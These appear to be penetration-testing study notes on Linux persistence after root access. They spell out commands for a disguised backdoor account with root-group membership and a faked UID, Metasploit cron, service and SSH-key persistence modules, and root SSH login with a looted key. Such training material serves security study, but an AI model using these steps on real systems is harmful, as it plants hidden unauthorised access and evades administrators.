# Establishing Persistence On Linux

* Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials and other interruptiongs that could cut off their access.
* Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
* The persistence techniques we can utilize will depend on the target configuration.
* We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

## Practice Demo

<mark style="color:blue;">We start by exploiting the "chkrookit" vulnerability to get root access on the target</mark>

<mark style="color:red;">YOU NEED ROOT PRIVILEGES FOR ALL OF THIS</mark>

### Creating a backdoor user

When creating a backdoor user, provide it a name that is difficult to identify.

* <mark style="color:yellow;">useradd -m ftp -s /bin/bash</mark>
  * <mark style="color:purple;">NOTE:</mark> Have in mind that we can specify a <mark style="color:red;">home directory</mark> (in this case it is the default), to blend in more since we are trying to mimic a <mark style="color:blue;">service account.</mark> And also could define the shell to be <mark style="color:red;">/usr/sbin/nologin</mark>

Define the password with:

* <mark style="color:yellow;">passwd ftp</mark>

#### Provide the new user with root privileges

* <mark style="color:yellow;">usermod -aG root ftp</mark>
  * <mark style="color:yellow;">-aG</mark>: Add to group

#### Change the user ID to make it look like it wasn't just created

* <mark style="color:yellow;">usermod -u 15 ftp</mark>
  * Sets the ID as 15

Now we can login through SSH with this account.

### Using a msf module for persistence

* <mark style="color:yellow;">exploit/linux/at\_package\_manager\_persistence</mark>: Will run a payload everytime the package manager is used. <mark style="color:red;">NOT GREAT</mark>
* <mark style="color:yellow;">exploit/linux/local/cron\_persistence</mark>: Creates a cron job that connects to your handler
  * Default timing is 60 seconds
  * Make sure LPORT is not conflicting
* <mark style="color:yellow;">exploit/linux/local/service\_persistence:</mark> Creates a service on the target, marks it for auto-restart. Enough access is needed to write services files and potentially restart them
  * Set the payload
* <mark style="color:yellow;">exploit/linux/manage/sshkey\_persistence</mark>: Sets up a key pair and adds the public key to the home directories of a specified user or all users on the target system. <mark style="color:red;">GREAT MODULE</mark>
  * set CREATESSHFOLDER true
  * set SESSION

Now just copy the private key, that is in the <mark style="color:red;">loot.</mark>

Create a "<mark style="color:red;">ssh\_key</mark>" file and give it the necessary permissions<mark style="color:red;">:</mark>

* <mark style="color:yellow;">chmod 0400 ssh\_key</mark>

Now we can authenticate no any user we want.

* <mark style="color:yellow;">ssh -i 'ssh\_key' root@targetIP</mark>



